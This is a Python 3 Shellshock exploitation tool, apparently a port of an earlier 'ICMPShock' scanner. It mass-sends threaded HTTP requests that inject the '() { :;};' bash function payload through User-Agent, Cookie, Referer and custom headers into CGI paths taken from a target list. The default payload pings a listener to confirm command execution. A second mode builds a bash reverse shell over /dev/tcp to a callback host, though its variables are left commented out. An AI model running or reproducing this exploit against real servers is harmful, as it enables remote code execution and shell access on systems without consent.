#!/usr/bin/env python3


# Intro:
# ICMPShock python3 implementation
# Bash usually dose not on windows so no windows OS support
# Add feature for getshell


def banner():
#Our banner, doubled slashes added for proper formatting when banner is shown in STDOUT.
    print("-" * 70)
    print("""
  _____ _____ __  __ _____   _____ _                _    ____  
 |_   _/ ____|  \/  |  __ \ / ____| |              | |  |___ \ 
   | || |    | \  / | |__) | (___ | |__   ___   ___| | __ __) |
   | || |    | |\/| |  ___/ \___ \| '_ \ / _ \ / __| |/ /|__ < 
  _| || |____| |  | | |     ____) | | | | (_) | (__|   < ___) |
 |_____\_____|_|  |_|_|    |_____/|_| |_|\___/ \___|_|\_\____/ 
                                                               
IMCPShock3 - ICMPShock python3 implementation (From: https://github.com/cheetz/icmpshock)
                                        By JohnRyk(JRZ) <SEC Newbie>
                                        GITHUB: https://github.com/JohnRyk
""")

    print("Make Sure to Start Your ICMP Listner First | tcpdump -nni eth0 -e icmp[icmptype] == 8")
    print("Usage | python icmpshock.py <listener_IP> <targets_file>")
    print("E.X   | python icmpshock.py 127.0.0.1 target_list.txt")
    print("-" * 70)


import sys
import requests
from threading import Thread
import time
from queue import Queue

def send_req(t_url,payload,method="POST"):
    target_url = t_url
    target_headers = {\
        #"Host": "() { :;}; %s" % payload,\
        "User-Agent": "() { :;}; %s" % payload, \
        "Cookie": "() { :;}; %s" % payload, \
        "Referer": "() { :;}; %s" % payload, \
        "XXX": "() { :;}; %s" % payload, \
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",\
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", \
        "Accept-Encoding": "gzip, deflate",\
        "Connection": "close", \
        "Upgrade-Insecure-Requests": "1", \
        "Cache-Control": "no-transform"\
    }
    if method == "GET":
        #r = requests.get(target_url, headers=target_headers, proxies={"http":"127.0.0.1:8080"})
        r = requests.get(target_url, headers=target_headers)
        return r
    elif method == "POST":
        post_data = {}
        #r = requests.post(target_url, headers=target_headers, data=post_data, proxies={"http":"127.0.0.1:8080"})
        r = requests.post(target_url, headers=target_headers, data=post_data)
        return r



def doSomethingWithResult(status, url):
    #Only print a URL to STDOUT when an HTTP 200 response is received.
    if status == 200:
        print("\033[1;32m[+] \033[1;mHTTP CODE 200 > {}".format(url))
    elif status != 404:
        print("\033[1;31m[*] \033[1;mHTTP CODE {} > {}".format(status,url))
    else:
        pass
        # No verberos
        # print("[-] HTTP CODE %s > {}".format(url) % status)


def doWork(payload,method):
    while True:
        url = q.get()
        r = send_req(url,payload,method)
        doSomethingWithResult(r.status_code, url)
        q.task_done()


if __name__ == "__main__":

    listener_ip = sys.argv[1]
    target_file = sys.argv[2]
    targets = open(target_file, "r")

    method = "POST"         # GET|POST

    mode = "ping"
    # call_back_ip = "192.168.2.1"
    # call_back_port = "4444"


    if mode == "ping":
        # ping test payload (unix)
        payload = "/bin/ping -c 2 " + listener_ip
    elif mode == "shell":
        # reverse shell payload (bash) 
        payload = f"/bin/bash -i >& /dev/tcp/{call_back_ip}/{call_back_port} 0>&1"
    elif mode == "dns":
        # trigger DNS log
        pass


    concurrent = 100
    # Resource pool
    q = Queue(concurrent * 2)
    for i in range(concurrent):
        t = Thread(target=doWork, args=(payload,method)) #Set the doWork() function as a target for the threading daemon
        t.daemon = True
        t.start() #Start our threading daemon.

    try:
        #Print our banner, show values set, and wait for user input
        banner()
        print("\033[1;34m[*] \033[1;mListening Address: {}".format(listener_ip))
        print("\033[1;34m[*] \033[1;mThread Count: {}".format(concurrent))
        print("")
        print("-" * 40)
        print("\033[1;34m[*] \033[1;mTarget Addresses")
        print("-" * 40)
        print("\033[1;32m>>\033[1;m {}".format(targets.read().strip()))
        targets.close()
        print("-" * 40)
        print("")
        input("\033[1;34m[*] \033[1;mPress [ENTER] to start scan-")
        
        #Append http:// to our URL read from our url list if it isn't defined
        #Then, append a cgi file path to the end of our URL and add it to the queue
        
        for url in open(target_file):
            if "http" not in url:
                url = "http://" + url.strip()
            else:
                url = url.strip()
            for file in open('Updated_list_Cgi_files.txt'):
            #for file in open(cgi_file): #Uncomment this line if you are using your own cgi path file as the 3rd system argument (sys.argv[3]).
                q.put(url.strip() + file.strip())
        q.join()

    except Exception as e:
        #Throw an error if something goes wrong.
        print(e)


